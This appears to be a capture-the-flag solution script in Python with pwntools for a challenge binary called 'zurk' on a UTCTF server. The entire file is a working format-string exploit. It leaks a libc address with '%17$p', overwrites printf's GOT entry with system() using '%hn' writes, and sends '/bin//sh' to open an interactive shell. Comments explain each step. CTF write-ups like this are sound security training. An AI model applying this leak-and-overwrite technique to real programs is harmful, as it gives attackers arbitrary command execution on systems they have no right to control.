#!/usr/bin/env python

from pwn import *
import sys

libc = ELF('libc-2.23.so')

#p = process('./zurk')
p = remote('binary.utctf.live',9003)
p.recvuntil('to do?')

### step 1 leak libc address
# exploiting printf "%p"
# figured this out by hand, with gdb,
# just keep incrementing until it looks interesting,
# then disas address, scroll up and see if you can see __libc_start_main,
# if so record the delta of the addresses, 240 in my case and the version
# of libc matters!

p.sendline('%17$p')
__libc_start_main = int(p.recvuntil('to do?').split()[0],0) - 240
__libc_start_main_offset = libc.symbols['__libc_start_main']
base = __libc_start_main - __libc_start_main_offset
__libc_system = libc.symbols['system']

### step 2 write out address of system over printf in got/plt
# 0x601020 is the location of printf in got/plt,
# it is easy to find with objdump or gdb, does not change
# exploiting printf "%n"

address = base + __libc_system
words=[ address & 0xFFFF, (address >> 16) & 0xFFFF ]

# prob should check for this and then do the math
# or change order, or just rerun, its a CTF
assert(words[0] < words[1])

payload = ""
payload += "%" + str(words[0]).rjust(6,'0') + "x"
payload += "%0010$hn"
payload += "%" + str(words[1]-words[0]).rjust(6,'0') + "x"
payload += "%0011$hn"
payload += struct.pack("<Q",0x601020)
payload += struct.pack("<Q",0x601020 + 2)

p.sendline(payload)
p.recvuntil('to do?')

### step 3
# tell "printf" really system to run /bin/sh
p.sendline('/bin//sh')

# get the flag
p.interactive()
